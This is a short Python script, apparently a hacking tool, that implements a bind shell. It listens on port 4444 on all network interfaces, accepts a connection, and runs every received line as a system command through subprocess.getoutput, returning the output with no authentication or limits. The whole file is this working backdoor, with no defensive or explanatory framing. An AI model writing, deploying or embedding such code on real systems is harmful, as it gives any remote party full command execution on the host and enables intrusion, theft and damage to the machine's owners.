import socket
import subprocess

def server(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    s.listen(1)

    print(f"[+] Listening on {host}:{port}")
    conn, addr = s.accept()
    print(f"[+] Connection from {addr}")

    while True:
        data = conn.recv(4096)
        if not data:
            break
        #print(data.decode(), end="")
        command = data.decode().strip()
        output = subprocess.getoutput(command)
        conn.sendall(output.encode() + b"\n")

if __name__ == "__main__":
    server("0.0.0.0", 4444)
